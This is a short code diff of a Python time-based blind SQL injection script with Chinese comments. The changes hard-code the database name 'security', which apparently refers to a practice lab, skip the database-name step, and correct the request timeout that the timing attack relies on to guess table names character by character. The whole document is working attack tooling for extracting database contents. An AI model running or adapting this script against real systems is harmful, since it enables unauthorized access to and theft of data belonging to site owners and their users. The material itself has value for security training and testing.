@@ -1,7 +1,7 @@
 import requests
 
 # 存放数据库名变量
-DBName = ""
+DBName = "security"
 # 数据库表列表
 DBTables = []
 # 数据库字段列表
@@ -11,7 +11,7 @@ DBData = {}
 
 # 盲注主函数
 def StartSqli(url):
-    GetDBName(url)
+    # GetDBName(url)
 
     GetTableName(url,DBName)
     print("[+]数据库{0}的表如下:".format(DBName))
@@ -103,7 +103,7 @@ def GetTableName(url,DBName):
         ## 获取当前长度
         while(1):
                 try:
-                    requests.get(targetUrl.format(DBName,a,tableLen),2)
+                    requests.get(targetUrl.format(DBName,a,tableLen),timeout=2)
                 except Exception:
                     tableLen += 1
                 else:
@@ -118,7 +118,7 @@ def GetTableName(url,DBName):
             targetUrl = url + payload
             for c in range(33, 128):
                 try:
-                    requests.get(targetUrl.format(DBName, a, b, c),2)
+                    requests.get(targetUrl.format(DBName, a, b, c),timeout=2)
                 except Exception:
                     print(f"正在获取第{a}段表名，猜解第{b}个字符，第{c-32}次失败")
                 else:
